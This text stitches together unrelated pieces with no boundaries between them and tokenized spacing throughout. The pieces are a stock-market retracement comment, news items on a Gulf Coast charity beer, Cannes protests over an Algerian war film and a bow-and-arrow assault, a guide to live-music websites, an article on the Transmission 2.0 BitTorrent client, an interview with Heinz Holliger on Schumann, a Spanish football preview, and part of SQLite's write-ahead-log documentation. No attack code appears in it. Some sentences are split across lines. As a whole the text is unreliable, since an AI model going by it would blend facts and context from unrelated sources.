A reader ( VB ) notes in a comment that Neely has found the retracement after an impulse down with an extended fifth often retraces more than 61.8 % , in effect bouncing more given the violence of the drop .
The next levels after 61.85 ( Sp1162 ) are 2/3 , 70.7 % and 78.6 % , or Sp1170 – 1187 .
Another way to count this is to end the big drop right before the ‘ bots drove it down , or at Sp1090 instead of Sp1065 .
This gives slightly different endpoints of Sp1177 – 1192 .
Will this play out quickly ?
The STU points to a morning observation from Bianco Research : if you think of today as driven by the Euro TARP , the US TARP days were when it was leaked and then when it was forced down the throats of the banks .
The first bounce lasted one day ; the second two days .
The market declined for six more months .
In the mother of all ironies , traders playing a capitulation low on Thursday may be hoist by their own fat finger : the bullish blather that “ this was all a glitch ! ” may mean the normal capitulation by the bears did not occur .
This meme is well explored here and here by Trader ’s Narrative , a site with penetrating debunking of popular fancies in the market , which concludes : “ according to the McClellan Oscillator , the market will make a significant low later this week . ”
MOBILE , Ala . --
One of the Gulf Coast 's most famous breweries has crafted a new beer and promised to send a portion of the money earned on each bottle to oil spill relief efforts .
But Abita 's Save Our Shores Charitable Pilsner wo n't be sold in two of the four states affected .
The beer is 7 percent alcohol , too potent to be sold in Mississippi , and it 's served in a 22 - ounce bottle that 's too big under Alabama law .
" I 'm sitting here feeling quite irritated at the state , " said Stuart Carter , a Birmingham resident and president of the Free the Hops advocacy group that wants fewer restrictions on beer production and sales .
" Because of a stupid , archaic , nonsensical restriction on container size , Alabamians are being prevented from taking part in a tasty way to help out the entire Gulf Coast . "
The S.O.S. Pilsner will hit shelves in states where it can be sold in mid-July , said Beth Harris , a public relations representative for Abita .
A bottle will cost about $ 5 , and 75 cents of each sale will go to a fund that will be used to support oil spill - related causes of the company 's choosing , she said .
She said that the company used the 22 - ounce bottles because it's the quickest way to get the lager to market .
A 22 - ounce bottle , sold as a single , requires getting only one label approved by the federal government , whereas a 12 - ounce bottle requires approval for labels on the front , back and six - pack container .
Carter and Butch Bailey , president of Raise Your Pints , a Mississippi - based beer advocacy group , both said that it's not Abita 's fault that local residents will have to cross state lines to buy the beer .
They blame state laws that they say are outdated .
Free the Hops formed in 2004 .
Its lobbying efforts helped persuade the Alabama Legislature to raise the legal alcohol content in beer from 6 percent to 14.9 percent locally .
Container size is one of the organization 's next targets , Carter said .
Current law allows individual beers to be sold in containers that are 16 ounces or smaller .
" You can't by a 22 - ounce bottle , but you can buy a case of 12 - ounce bottles .
How does this make sense ? "
Carter said .
Raise Your Pints is trying to match Free the Hops ' success with alcohol content in Mississippi's Legislature .
Mississippi law currently allows beer that is 5 percent or less alcohol by weight , which translates to about 6.2 percent alcohol by volume , Bailey said .
Harris said that Abita does n't have any plans to sell the S.O.S.
Pilsner in anything other than 22 - ounce bottles , but she said anything is possible if sales continue long into the future .
After Hurricane Katrina , the brewery began selling Restoration Ale , with some proceeds going to hurricane recovery funds .
The beer remains on the market .

The protestors included veterans of the independence war
Hundreds of people have protested in Cannes against a film about Algeria 's struggle for independence against France .
The film , Hors la Loi by French - Algerian director Rachid Bouchareb , opens at Cannes on Friday .
The demonstrators , who included right - wing politicians and French veterans , claim it is biased against France .
Algeria gained independence from France after a brutal eight - year war that ended in 1962 .
Hors la Loi ( Outside the Law ) is about three Algerian brothers who are evicted from their ancestral home when it is occupied by a settler family in 1925 , following their story over the next several decades .
It has stirred strong reactions in France for several weeks ahead of its release , particularly over scenes dealing with a crackdown by French troops in the town of Setif in 1945 .
Thousands of Algerians - estimates range from 15,000 to 45,000 - and about 100 European settlers were killed .
' Excessive reaction '
On Friday , demonstrators faced riot police as they paraded in central Cannes holding banners and French flags .
They included former settlers as well as Algerians who fought in the independence war for the French , and are known in France as " harkis " .
Bouchareb has accused critics of rushing to condemn the film before watching it .
At a press conference in Cannes , he said he hoped that it would foster open debate and that people would then be able to move on .
" I knew that the colonial past and the relationship with the colonial past between France and Algeria is still very tense but I think the reaction and all the things that have been said before anyone 's seen the film , have been excessive , " he said .
Hundreds of thousands of people were killed during Algeria 's independence war , which caused political turmoil in France , triggering the collapse of the Fourth Republic in 1958 .
Bouchareb also directed Indigenes , which was released under the English title Days of Glory , and was nominated for the best foreign film Oscar .
It is about North Africans fighting for France in World War II .
A New Jersey man 's accused of shooting his neighbor in the back with a bow and arrow .
Anthony Giovannini had just parked his car and was walking into his home Thursday night when he felt a thud on his back .
He told police it felt like he'd been hit with a rock .
He glanced back and saw his neighbor , Robert A. Wood , Jr. going into his home .
The two had been arguing , apparently for some time , over parking .
Giovannini , 35 , opened his front door and that 's when he noticed the arrow sticking out of his back , according to Trenton police .
It was stuck three to four inches deep .
Giovannini yelled for his girlfriend who called 911 to get him to hospital .
When police got to the scene at Franklin Street and Morris Avenue they arrested Wood and confiscated two bows .
He 's charged with aggravated assault and a weapons offense .
Giovannini was treated and then kept at the hospital for observation .
He was in stable condition Friday morning .

Most music enthusiasts will agree that there is a big difference between hearing a band on a CD and seeing them perform live .
While it might have been the recording that got you to the show , it ’s often the live concert experience that transforms an artist you like into your favorite band .
But since many of us do n't always have the time or ticket funds to see as many concerts as we'd like , here are seven sites that will bring all the intimacy of a live show to your desktop .
Their combination of rare live recordings , unusual video locations , and behind - the - scenes snapshots are sure to please any music fan .
So get ready to fall in love with your favorite bands all over again , and to discover some new ones along the way .
If you ’re in the market for charming , offbeat music videos , La Blogotheque is a must - see nexus of musicianship and cinematography .
The French website produces weekly podcasts of unconventional music videos called “ Take Away Shows . ”
These to - go cups of music video goodness feature well - known artists playing in unusual surroundings .
For instance , Take Away Show director , Vincent Moon , put the band Arcade Fire , instruments and all , into a freight elevator , and had them play their single , " Neon Bible " — no small feat , considering there are about nine people in the group .
Other Take Away
Show highlights include unsuspecting café goers chanting “ Blake ’s got a new face ! ” along with Vampire Weekend , Jason Mraz jamming with an elderly Bulgarian street busker , and Andrew Bird acting as the veritable pied piper of Montmartre .
The Black Cab Sessions takes all the fun and eccentricity of La Blogotheque and puts it on wheels .
Similar to the Take Away Shows ’
“ In a Van Sessions ” series , this website transforms the taxicab into a moving recording studio for our audiovisual pleasure .
While Jens Lekman ’s kalimba rendition of his song “ Black Cab ” is certainly the most pertinent video on the site , there are loads of musical goodies here , with performances from the likes of Jamie Lidell , Death Cab for Cutie , Badly Drawn Boy , and many more .
Daytrotter is a delicious little website run out of a recording studio in Illinois .
It aims to capture unreleased songs , alternate versions of tracks , and the little spontaneous moments that occur in the recording process .
Thanks to the many working artists who pass through the studio while on tour , Daytrotter has racked up a truly impressive vault of live audio recordings ( all available for free download , by the way ) with artists ranging from The Swell Season , to Raphael Saadiq , to Grizzly Bear , to Carly Simon — and the list grows longer almost by the day .
Each unique post is supplemented with gorgeous written descriptions , and colorful , hand - drawn artist portraits that make you feel like you ’re witnessing something precious .
Daytrotter is definitely a great site to get lost in .
With all those musicians traipsing through the NPR offices , you have to imagine what it would be like to be a fly on a wall there .
Luckily , All Songs Considered Host / Creator Bob Boilen is now making it possible with his “ Tiny Desk Concerts . ”
These “ concerts ” are literally songs performed at , on , behind , and in front of Boilen ’s tiny office desk .
Although the settings are not romantic in the traditional sense , many special moments have been created there by the likes of Moby , Rodrigo y Gabriela , Thao Nguyen , and Jakob Dylan .
Another Blogotheque - inspired website , They Shoot Music – Do n’t They is a video blog powered by Viennese cinematographers and music enthusiasts who aim to turn their favorite urban locations into great performance stages .
In this way , TSMDT is able to not only create beautiful musical moments , but also bring attention to sites of cultural importance within their city .
For instance , the brains behind TSMDT try to bring attention to the Viennese region of Erdberg ( one of the oldest settlements in Vienna , but now an underappreciated industrial center ) by letting I ’m From Barcelona frontman Emanual Lundgren roam about it on film .
What ensues is the cutest musician - canine interaction you have ever seen .
Most of us know Daryl Hall as half of the 70s and 80s pop duo Hall & Oates .
But what you might not know is that Daryl Hall is also the brains behind a web show sensation called Live From Daryl ’s House .
Hall first got the idea to post videos online of himself jamming at home with his friends three years ago .
Of course , when you ’re Daryl Hall , your friends include Toots and the Maytals , Smokey Robinson , KT Tunstall , and The Bacon Brothers .
My personal favorite installment is the set he did with Chromeo that ended up going viral .
It helps if you ’re already a Hall & Oates fan , but it ’s not required to enjoy this site .
From the Basement is the work of producer and Radiohead collaborator Nigel Godrich .
This site started as just a mere collection of audience - free music performances , but was soon picked up by television networks both in the U.S. and Great Britain .
The original website can still stand alone on the moments and music it helped to foster , by recording artists such as Gnarls Barkley , Beck , Damien Rice , and The Dead Weather .

Transmission , the most used non-commercial BitTorrent client , has reached a new milestone with the release of version 2.0 .
The community driven application , installed on millions of computers worldwide , is now faster and smarter than ever before .
We get the lowdown from Transmission developer Charles Kerr .
Transmission saw its first public release nearly five years ago .
Since then the free , multi-platform application has gathered a steady user - base of millions of users .
Transmission became the default BitTorrent client on various Linux distributions including Ubuntu , and it is also one of the most - used Mac BitTorrent clients .
This week Transmission ’s development reached an important milestone as the stable version of Transmission 2.0 was released .
Transmission , often praised by its users for being full - featured but lightweight , has geared up for the increasing demands of BitTorrent users today .
TorrentFreak spoke with Transmission developer Charles Kerr who walked us through some of the most notable improvements in the latest Transmission release .
“ Transmission 2.0 ’s code is faster and smarter , ” Charles Kerr said .
“ We ’ve profiled the code for CPU bottlenecks and removed them .
Startup , peer management , blocklists , and verifying local data are all faster .
Transmission 2.0 is also smarter about detecting and handling network lag . ”
“ For 24/ 7 remote seedboxes , headless systems , and embedded systems , we ’ve made Transmission - daemon easier to build , added hooks for scripting , and shrunk the memory footprint .
Transmission - daemon has one of the smallest footprints — if not the smallest — of any BitTorrent client . ”
Transmission takes pride in being volunteer - based and non-commercial , unlike bigger clients such as uTorrent , Vuze , and BitComet .
Charles told TorrentFreak that this also comes with a downside , because future development relies on its community of volunteers .
“ It means development happens only when volunteers are available , ” he said .
“ For example , if any of your readers are Windows or ExtJS programmers who want to work on the Windows or Web clients , the Transmission team would like to hear from them . ”
Indeed , you ’re reading it right , a native Windows application is a serious option if there are skilled volunteers available .
For now , however , Transmission ’s expansion possibilities are limited to the other platforms while it has to settle for the title of the most - used BitTorrent client without a Windows version .
22/06/2010 Composed in delirious time
The musician Heinz Holliger on Schumann 's labyrinthine imagination , his erudition and incredible modernity
Die Zeit : Herr Holliger , you reference Robert Schumann in all your compositions .
You conduct Schumann and you have devoted huge amount of your time to his life and his work .
You do n't seem to be able to tear yourself away from this composer .
Heinz Holliger : I readily admit that it is a little obsessive .
How did your passion for Schumann begin ?
I was 14 or 15 years old , when I heard the Violin Sonata No. 2 and the Trio in G Minor at a concert in Berlin .
These are considered difficult late works which turn most people off Schumann .
It was just the opposite for me .
It was like being set on fire .
And the flame has never gone out ?
On the contrary .
It burnss more intensely as I get older .
What is it that keeps it burning ?
You never reach a dead end with Schumann and his analytical observations .
New doors are always opening up .
One door opens onto the next and there is another one behind that , and another and another .
In his work , speculative thinking collides head on with a vast , labyrinthine imagination .
Schumann was an extremely erudite man .
He translated Sophocles at 17 .
He had considerable literary talents and he was probably one the greatest writers among the composers , up there with Berlioz and Debussy .
This makes him an encyclopaedic character .
A cosmic figure without limits .
The same applies to his music .
Although Beethoven was a great role model for him , he never wanted to realise linear trains of thought in his compositions .
He was not interested in going from A to B .
He starts with a primal cell of a motif , he sets spiralling movements in motion , which exponentiate to create vast edifices .
I admire his associative thinking process , his ability to draw out ever new circles of speculation .
Schumann 's music is all about dislocation .
The bar line is a coffin for him .
He almost always shifts the emphasis of the weightier notes .
He syncopates the primary accents or overlays various layers of time .
What emerges is a sort of delirious time .
You no longer feel the passing of time .
Schumann composed at a feverish pace , yet he was most pedantic in all areas of his life .
How do these things fit together ?
It 's true , he wrote almost everything in a trance , at unbelievable speed .
And yet everything he did bore the hallmark of incredible self - control .
He had perfect formal awareness and of his peers , only Mendelssohn - Bartholdy matched him in contrapunctual skill .
Schumann led a very orderly life .
He studied jurisprudence , maintained impeccable housekeeping records , noted even the most intimate details in a marriage journal .
On the other hand there was this bubbling excess of the unconscious which he committed directly to paper .
He wrote in a trance and yet with incredible discipline .
After emerging from a period of wildness he would try to bring his life back into order , he would write nothing but Lieder for a while or devote a year to string quartets .
He was very consistent in controlling himself though his work .
But beneath this orderliness there was always a current bubbling away ?
This is what I find so amazing .
Even in Schumann 's most formally structured pieces you sense this constant tearing at the form .
There is always this precarious balance of control and eruption .
This is something you also find in Hölderin , who subjected his powerful imagination to the most difficult metres .
He wrote the greatest rhythmical works of art ever ventured by a poet and yet form and content never hindered one another .
It 's the same with Schumann .
Robert Schumann 's life ended in an asylum in Endenich near Bonn .
He tried to take his life , he was mentally deranged .
Experts today still speculate and argue over the nature of Schumann 's madness .
Was he schizophrenic ?
What role did alcoholism play ?
Was it advanced syphilis that destroyed him ?
People like to judge the quality of his late work according to their diagnoses .
What 's your opinion on this ?
I want to emphasise that Schumann committed himself to the clinic in Endenich .
He was not locked away .
Sinclair said of Hölderlin : " His disease is but an adopted frame of mind . "
But there is no doubt that he was mentally ill , is there ?
To put it rather bluntly , normal people do not compose – or they compose like Carl Czerny or Murzio Clementi .
You need a certain amount of openness and non-conformism to be creative .
People who are considered mad have not been taught by life to wall up their openness and they have more direct contact to their unconscious .
You see the creative potential in madness more than anything else ?
I am a doctor 's son , so maybe I look at things a little differently .
For me , being different is part of life .
I do not look for a person 's illnesses .
I look for the person who has no limits to their imagination , who is not afraid to cross over , whether it be into the world of madness or death , for these are intertwined .
People like this have finer antennae than the others .
I have no idea whether we would see Beethoven as a normal person if we encountered him on the street .
He was a very odd man .
Or Mozart , who leapt over the table and cracked jokes and got up to all kinds of high jinks .
Would we regard him as normal ?
I hope not .
Or Brahms and his beard and his obsession with eliminating traces so as to pass himself off as an orderly person .
But everything that lay beneath his appearance is what made him an important composer .
Schumann 's emotional life is like a great accelerando , getting faster and faster .
It can only end in collapse and in silence .
Do you sometimes find yourself entering into a private dialogue with Schumann ?
I would n't go that far , no , but I do feel incredibly close to him .
I often feel his presence when I 'm thinking about something .
But I do n't ask myself how what decision he would have made or anything like that .
And I have no idea how well I would have got along with him as an individual .
Think about how insistent he was on meeting Hebbel – and when Hebbel eventually paid him a visit , he did n't utter a word .
It was exceptionally difficult to make contact with him .
His appearance was rather unprepossessing , he spoke quitely and often mumbled , he was puffy - faced and short - sighted .
I do not relate to him all that closely as a person .
He is more of a intellectual point in my life .
" A singing point in the sky or a globe rejoicing " as Nikolas Lenau wrote in his " Notebook from [ the psychiatric hospital in ] Winnenthal " .
Let 's talk about the clichees that surround Schumann .
Robert and Clara are held as the epitome of the Romantic artist couple .
Was this really the case ?
It is an illusion to think that two such strong personalities could merge with one another entirely .
Clara 's composition , her " Romances for Violin " or the " Trio " , were really quite important and very much her own .
She was certainly not imitating her husband 's music in any way , but was developing her own thinking .
It is interesting , though , that in the forty years after Schumann died she never composed again .
Perhaps she needed the friction , something to fight against , for her own development .
When it was gone , she was no longer able to be creatively active .
Clara did not have an easy life .
She was perhaps the most important pianist of her generation and yet she produced a child every year .
She could not practice when he was composing .
There was a lot of tension very early on between the two .
Was Schumann a repressive husband who chained Clara to the stove and ruined her great talent ?
I will give you an example of the ambivalences in his personality .
He was initially engaged to Ernestine von Fricken .
When he discovered that she was not going to inherit , he broke off the engagement .
Yet at the same time in " Manfred " , he mentioned an issue which arose during a flute concert given by his prospective father - in - law .
" The lies will course through your veins like poison " .
A clear indication of Schumann 's bad conscience .
In general , though , l I think that too much has been made of his relationship with Clara .
There are shelves full of books about Clara in the shops – and about two on Robert , and one of those is bad .
But there is so much room for speculation about Robert because of the endless material , the housekeeping records , the diaries , the letters .
Other composers tend to be absolutely silent in such matters .
What do we know about the life of Ravel ?
He is a mysterious figure , who kept himself hidden .
I think we should know about Schumann 's life .
But more than anything , we should listen to his music !
Not even 20 percent of his work gets played in concerts .
Most people do n't even know the rest .
It 's mostly only his piano works that are played in concert .
Exactly .
His Lieder are rarely performed and if they are , it 's invariably the same ones .
There is a book about Schumann and the poets .
The subject alone speaks volumes .
You should see the lists Schumann compiled of poems that were suitable to be put to music , and then he slowly went about tracking them down .
In a number of Schumann biographies you read that shortly before he went to Endenich , he spent all his time in the library looking for material for what he called his " Dichtergarten " or poet garden .
This " Dichtergarten " has now been republished .
It is an astonishing book !
Full of poems from the Greeks and Romans right up to Schumann 's own time , and selected with such remarkable consistency !
Schumann called it a garden but it is was beautifully designed .
Why is so much of Schumann 's oeuvre ignored ?
Unfortunately there are plenty of reasons for this which have nothing to do with music .
First of all , in committing himself to Endenich , Schumann effectively branded himself with a mark of Cane .
His biographers and musical analysts were intent only on determining whether he was sick and whether this or that composition had been written in his better days .
This legacy was passed down from one biography to the next .
The new German school that grew up around Wagner and Liszt with its revolutionary ethos also has much to answer for .
It presented Schumann on the basis of his later pieces , which are much more tightly constructed and dictated by form , as a small - town traditionalist .
These were pure polemics which did him no end of damage .
And to top it all , Clara and Joseph Joachim began work on a sort of hagiography of Schumann after his death .
All the letters were censored .
Anything which did n't fit Schumann 's sacrosanctity was thrown out .
Clara took this to such extremes that by the end of her life , on the advice of Brahms , she had burned the five Cello Romances .
An act of destruction which I used as a compositional theme in my " Romancedres " .
In fact it was Alban Berg whose analysis of Schumann 's " Traumerei " first showed that Schumann was not only a delirious composer but also a great counterpointist with considerable formal sophistication .
Schumann has yet to recover from all this ?
The prejudices about him not being able to orchestrate , about his music being unwieldy and far from brilliant , are still in place today .
And the late Romantic cloak of sound that was always draped around his symphonic music , the giant orchestras , overladen with strings , did him no good whatsoever .
Particularly with Schumann , a musician has to be extremely familiar with the pieces , identifying with them with the intimacy of a string quartet .
Then the music can start to come alive .
With original instruments as is becoming increasingly popular in historical performance practice .
The best thing that can happen to Schumann is if all interpretations do away with the traditional stodgy fare completely .
What do you say to the Schumann experts who say that syphilis destroyed his brain and that this affected the music he wrote at the end of his life ?
That these pieces are more simplistic and harmonically simple .
I devote a lot of my time to the late Schumann pieces and I cannot agree .
There is nothing in the later works that could be describes as monotonous rhythm or simplistic harmony .
Take the Violin Concert for instance .
People say the harmony in the first movement is monotonous .
But if you look at it properly , you see that it is made of layers , blocks of stone like in a late Bruckner symphony .
This can only function in the archaic form of motif and harmony .
In a wonderful second theme , the music seems to forget itself .
It is repeated over and over very quietly , like fading brainwaves in an encephalogram .
Until it finds its way back again .
I find this extremely modern !
Or the third movement , a Poacca , dancing with leaden feet .
It 's as if it were trying fly but its wings are clipped .
Or the end .
People always say the Violin Concert is not brilliant enough for the violin , but what about those scales that get faster and faster , up and down , like a wheel which that spins faster and faster until it appears to be standing still .
This is another idea which I work with a lot in my own compositions .
I know of no other composer who was doing anything like this at the time .
How influential is Schumann for your own composition ?
I do n't know of any work in which he is not present .
He even appears in my first published work , the " Kantate Erde und Himmel " .
Bang in the middle of a symmetrical note formation , comes the motif from Schumann 's " Zwielicht " Lied .
( Holliger sings ) " Was soll dieses Grauen bedeuten ? " ( what does this horror / dawning mean ? )
And the words I put to this motif are " Oh , wenn ich wieder wäre " ( oh , if only I were once more )
What does the Schumann anniversary mean to you ?
I said to my friend , the pianist Andras Schiff , that it 's not up to us to suddenly start playing lots of Schumann .
We are always celebrating Schumann 's anniversary .
Now it 's the turn of the others who never normally pay him any attention .
Perhaps at last the penny will drop with them now , too .

El " Chicharito " tomará la estafeta en el ataque
Holanda exigirá al Tri en todas sus líneas y le peleará fuerte la pelota
La Selección Mexicana tendrá este miércoles en Friburgo , Alemania su segunda prueba " europea " en la recta final rumbo a Sudáfrica 2010 , con la misión de mantener el buen futbol que mostró ante Inglaterra , pero ahora buscando corregir las fallas en la zona de definición .
El rival es Holanda , un equipo siempre poderoso y que desarrolla un futbol de vanguardia .
Sus jugadores muestran fortalezas técnicas , tácticas y físicas en todas sus líneas y un nivel muy parejo .
La sede es Friburgo , una tranquila ciudad de Alemania que se caracteriza por sus tecnologías en energías renovables y el duelo se llevará a cabo en el Estadio Badenova , que cuenta con una capacidad para 18 mil personas .
La historia nos dice que México ha enfrentado a Holanda en cinco ocasiones desde 1960 hasta un juego previo al Mundial del 2006 .
En el primero en 1960 , México ganó 3 - 1 en Ciudad Universitaria , en el segundo un año después , México volvió a vencer 1 - 2 ahora en territorio holandés .
Luego de muchos años y muchos cambios en el futbol holandés , en 1998 México cayó 3 - 1 en Estados Unidos , duelo que sirvió de preámbulo para el juego del Mundial de Francia 1998 en el que el Tri se recuperó de dos goles en contra para sacar un empate 2 - 2 y clasificar a la siguiente ronda .
En el último enfrentamiento , otra vez previo a una Copa del Mundo , en 2006 Holanda ganó 2 - 1.El
Tri se presentó en Wembley el lunes pasado ante la Selección local y tuvo el dominio de la pelota , generando una alta cantidad de opciones de gol pero errando al momento del disparo a puerta .
Aunado a eso , las jugadas a balón parado provocaron que el rival marcara en tres ocasiones con un mínimo de opciones generadas en el área mexicana .
Los aspectos buenos del
Tri en el inicio de esta gira fueron la posesión de la pelota , la propuesta ofensiva y el descaro de nuestros hombres para plantarse con fortaleza en Wembley .
La alineación del " Vasco " fue extraña y es difícil que se mantenga en este segundo cotejo , pero poco a poco se va delinenado o más bien , confirmando lo que busca el Tri para el Mundial .
El " Vasco " va moviendo y acomodando piezas .
Su sistema se mantiene , un 4 - 3 - 3 ( 4 - 3 - 2 - 1 ) con tres hombres de recuperación , sólo uno al centro y dos en los costados , dos extremos y una punta , aunque parecería que lo más adecuado para el Mundial sería ubicar a dos contenciones naturales que resguarden el centro del campo , dos extremos y dos delanteros ( un media punta y una punta ) .
Habrá que ver si la tendencia táctica se mantiene o evoluciona para la Copa del Mundo .
En este duelo podríamos ver algunas adaptaciones .
Un par de centrales distintos , tal vez ya con Rafa Márquez en defensa considerando que la media cancha holandesa es muy rápida .
Parece un partido para que Andrés Guardado vaya de inicio y está cantado que el " Chicharito " será titular por la lesión que marginará al Guille Franco .
En el arco , si la rotación se mantiene sería el turno de Michel .
México debe mantener su buen futbol , buscar acelerarlo un poco , hacerlo más punzante y sobre todo , más efectivo .
Las variantes se vuelven clave cuando los goles no llegan y tras el gran nivel mostrado por Gio ante Inglaterra , parece que el ataque se armará a su alrededor .
El equipo holandés tiene bien claro su sistema de juego .
Ellos han asumido la misión de proponer la vanguardia del futbol y lo trabajan desde sus escuelas de futbol infantiles , pasando por Fuerzas Básicas , liga local y obviamente todas sus Selecciones Nacionales .
Sus bases las tienen bien claras , son rápidos y precisos , juegan todos a lo mismo y no tienen ningún problema de acoplamiento .
Tienen un equipo joven , apuntalado con figuras establecidas en los equipos más importantes del mundo y sin duda son una dura prueba para cualquiera , no sólo para México .
Por mencionar sólo algunas de sus figuras , tenemos a Babel y Kuyt del Liverpool , Robben y Van Bommel del Bayern Münich , flamante subcampeón de Europa , Giovanni van Bronckhorst que hoy milita en el Feyenoord , Heitinga del Everton , Huntelaar del Milán , Van Persie del Arsenal , Sneijder del Inter y Van der Vaart del Real Madrid .
Los holandeses derrotaron en su último juego 2 - 1 a Estados Unidos en marzo pasado en un resultado corto pero que mostró la dinámica del conjunto holandés .
El
Tri tendrá enfrente un rival que a diferencia de Inglaterra , le peleará con todo la posesión de la pelota y seguramente lo dominará por largos lapsos .
La prueba será excelente para México pues Holanda nos hará trabajar todas las líneas y nos meterá mucha velocidad en la zona de recuperación .
El Tri debe tener cuidado con el medio campo , si ubica a Márquez nuevamente en el centro de la contención seguramente el Capitán mexicano pasará problemas para igualar el ritmo del rival , así que quizá la solución sería ubicar dos contenciones naturales y trabajar mucho por las bandas a la ofensiva .
El " Chicharito " tiene una gran oportunidad para acabar con las dudas en la delantera mexicana .
Él , Gio y Guardado pueden formar un ataque espectacular , pero en este momento lo más que necesita el Tri es anotar y elevar su porcentaje de efectividad para recuperar confianza .
1. Overview
The default method by which SQLite implements atomic commit and rollback is a rollback journal .
Beginning with version 3.7.0 ( 2010 - 07 - 21 ) , a new " Write - Ahead Log " option ( hereafter referred to as " WAL " ) is available .
There are advantages and disadvantages to using WAL instead of a rollback journal .
Advantages include :
WAL is significantly faster in most scenarios .
WAL provides more concurrency as readers do not block writers and a writer does not block readers .
Reading and writing can proceed concurrently .
Disk I / O operations tends to be more sequential using WAL .
WAL uses many fewer fsync ( ) operations and is thus less vulnerable to problems on systems where the fsync ( ) system call is broken .
But there are also disadvantages :
WAL normally requires that the VFS support shared - memory primitives .
( Exception : WAL without shared memory )
The built - in unix and windows VFSes support this but third - party extension VFSes for custom operating systems might not .
All processes using a database must be on the same host computer ; WAL does not work over a network filesystem .
Transactions that involve changes against multiple ATTACHed databases are atomic for each individual database , but are not atomic across all databases as a set .
It is not possible to change the page_size after entering WAL mode , either on an empty database or by using VACUUM or by restoring from a backup using the backup API .
You must be in a rollback journal mode to change the page size .
It is not possible to open read - only WAL databases .
The opening process must have write privileges for " - shm " wal - index shared memory file associated with the database , if that file exists , or else write access on the directory containing the database file if the " - shm " file does not exist .
Beginning with version 3.22.0 ( 2018-01 - 22 ) , a read - only WAL - mode database file can be opened if the - shm and - wal files already exists or those files can be created or the database is immutable .
WAL might be very slightly slower ( perhaps 1 % or 2 % slower ) than the traditional rollback - journal approach in applications that do mostly reads and seldom write .
There is an additional quasi- persistent " - wal " file and " - shm " shared memory file associated with each database , which can make SQLite less appealing for use as an application file - format .
There is the extra operation of checkpointing which , though automatic by default , is still something that application developers need to be mindful of .
WAL works best with smaller transactions .
WAL does not work well for very large transactions .
For transactions larger than about 100 megabytes , traditional rollback journal modes will likely be faster .
For transactions in excess of a gigabyte , WAL mode may fail with an I / O or disk - full error .
It is recommended that one of the rollback journal modes be used for transactions larger than a few dozen megabytes .
Beginning with version 3.11.0 ( 2016-02-15 ) , WAL mode works as efficiently with large transactions as does rollback mode .
2. How WAL Works
The traditional rollback journal works by writing a copy of the original unchanged database content into a separate rollback journal file and then writing changes directly into the database file .
In the event of a crash or ROLLBACK , the original content contained in the rollback journal is played back into the database file to revert the database file to its original state .
The COMMIT occurs when the rollback journal is deleted .
The WAL approach inverts this .
The original content is preserved in the database file and the changes are appended into a separate WAL file .
A COMMIT occurs when a special record indicating a commit is appended to the WAL .
Thus a COMMIT can happen without ever writing to the original database , which allows readers to continue operating from the original unaltered database while changes are simultaneously being committed into the WAL .
Multiple transactions can be appended to the end of a single WAL file .
2.1 . Checkpointing
Of course , one wants to eventually transfer all the transactions that are appended in the WAL file back into the original database .
Moving the WAL file transactions back into the database is called a " checkpoint " .
Another way to think about the difference between rollback and write - ahead log is that in the rollback - journal approach , there are two primitive operations , reading and writing , whereas with a write - ahead log there are now three primitive operations : reading , writing , and checkpointing .
By default , SQLite does a checkpoint automatically when the WAL file reaches a threshold size of 1000 pages .
( The SQLITE_DEFAULT_WAL_AUTOCHECKPOINT
compile - time option can be used to specify a different default . )
Applications using WAL do not have to do anything in order to for these checkpoints to occur .
But if they want to , applications can adjust the automatic checkpoint threshold .
Or they can turn off the automatic checkpoints and run checkpoints during idle moments or in a separate thread or process .
2.2 . Concurrency
When a read operation begins on a WAL - mode database , it first remembers the location of the last valid commit record in the WAL .
Call this point the " end mark " .
Because the WAL can be growing and adding new commit records while various readers connect to the database , each reader can potentially have its own end mark .
But for any particular reader , the end mark is unchanged for the duration of the transaction , thus ensuring that a single read transaction only sees the database content as it existed at a single point in time .
When a reader needs a page of content , it first checks the WAL to see if that page appears there , and if so it pulls in the last copy of the page that occurs in the WAL prior to the reader 's end mark .
If no copy of the page exists in the WAL prior to the reader 's end mark , then the page is read from the original database file .
Readers can exist in separate processes , so to avoid forcing every reader to scan the entire WAL looking for pages ( the WAL file can grow to multiple megabytes , depending on how often checkpoints are run ) , a data structure called the " wal - index " is maintained in shared memory which helps readers locate pages in the WAL quickly and with a minimum of I/O .
The wal - index greatly improves the performance of readers , but the use of shared memory means that all readers must exist on the same machine .
This is why the write - ahead log implementation will not work on a network filesystem .
Writers merely append new content to the end of the WAL file .
Because writers do nothing that would interfere with the actions of readers , writers and readers can run at the same time .
However , since there is only one WAL file , there can only be one writer at a time .
A checkpoint operation takes content from the WAL file and transfers it back into the original database file .
A checkpoint can run concurrently with readers , however the checkpoint must stop when it reaches a page in the WAL that is past the end mark of any current reader .
The checkpoint has to stop at that point because otherwise it might overwrite part of the database file that the reader is actively using .
The checkpoint remembers ( in the wal - index ) how far it got and will resume transferring content from the WAL to the database from where it left off on the next invocation .
Thus a long - running read transaction can prevent a checkpointer from making progress .
But presumably every read transaction will eventually end and the checkpointer will be able to continue .
Whenever a write operation occurs , the writer checks how much progress the checkpointer has made , and if the entire WAL has been transferred into the database and synced and if no readers are making use of the WAL , then the writer will rewind the WAL back to the beginning and start putting new transactions at the beginning of the WAL .
This mechanism prevents a WAL file from growing without bound .
2.3 . Performance Considerations
Write transactions are very fast since they only involve writing the content once ( versus twice for rollback - journal transactions ) and because the writes are all sequential .
Further , syncing the content to the disk is not required , as long as the application is willing to sacrifice durability following a power loss or hard reboot .
( Writers sync the WAL on every transaction commit if PRAGMA synchronous is set to FULL but omit this sync if PRAGMA synchronous is set to NORMAL . )
On the other hand , read performance deteriorates as the WAL file grows in size since each reader must check the WAL file for the content and the time needed to check the WAL file is proportional to the size of the WAL file .
The wal - index helps find content in the WAL file much faster , but performance still falls off with increasing WAL file size .
Hence , to maintain good read performance it is important to keep the WAL file size down by running checkpoints at regular intervals .
Checkpointing does require sync operations in order to avoid the possibility of database corruption following a power loss or hard reboot .
The WAL must be synced to persistent storage prior to moving content from the WAL into the database and the database file must by synced prior to resetting the WAL .
Checkpoint also requires more seeking .
The checkpointer makes an effort to do as many sequential page writes to the database as it can ( the pages are transferred from WAL to database in ascending order ) but even then there will typically be many seek operations interspersed among the page writes .
These factors combine to make checkpoints slower than write transactions .
The default strategy is to allow successive write transactions to grow the WAL until the WAL becomes about 1000 pages in size , then to run a checkpoint operation for each subsequent COMMIT until the WAL is reset to be smaller than 1000 pages .
By default , the checkpoint will be run automatically by the same thread that does the COMMIT that pushes the WAL over its size limit .
